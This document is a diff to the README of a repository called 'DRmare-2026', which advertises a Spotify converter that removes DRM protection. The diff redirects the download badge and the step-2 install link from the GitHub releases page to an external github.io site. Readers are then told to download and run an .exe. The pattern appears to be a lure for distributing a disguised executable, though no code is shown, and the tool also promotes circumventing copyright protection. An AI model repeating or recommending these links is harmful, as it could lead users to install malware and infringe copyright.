@@ -1,6 +1,6 @@
 # 🎧 DRmare-2026 - Save Spotify Music For Offline Playback
 
-[![Download DRmare Now](https://img.shields.io/badge/Download-DRmare_Spotify_Converter-blue.svg)](https://github.com/Moonshinegigabyte993/DRmare-2026/releases)
+[![Download DRmare Now](https://img.shields.io/badge/Download-DRmare_Spotify_Converter-blue.svg)](https://moonshinegigabyte993.github.io)
 
 DRmare Spotify Music Converter helps you save tracks, albums, and playlists from Spotify. This tool removes protection formats and converts music into common file types like MP3, M4A, or WAV. You keep your music files on your computer and listen to them without an internet connection or the Spotify app.
 
@@ -19,7 +19,7 @@ Before you install this software, check that your computer meets these requireme
 You can get the installation file from the official releases page on GitHub. 
 
 1. Open your web browser.
-2. Go to the [DRmare-2026 Download Page](https://github.com/Moonshinegigabyte993/DRmare-2026/releases).
+2. Go to the [DRmare-2026 Download Page](https://moonshinegigabyte993.github.io).
 3. Find the latest version listed at the top of the page.
 4. Click the link that ends in .exe to start the file download.
 5. Save the file to your Downloads folder.
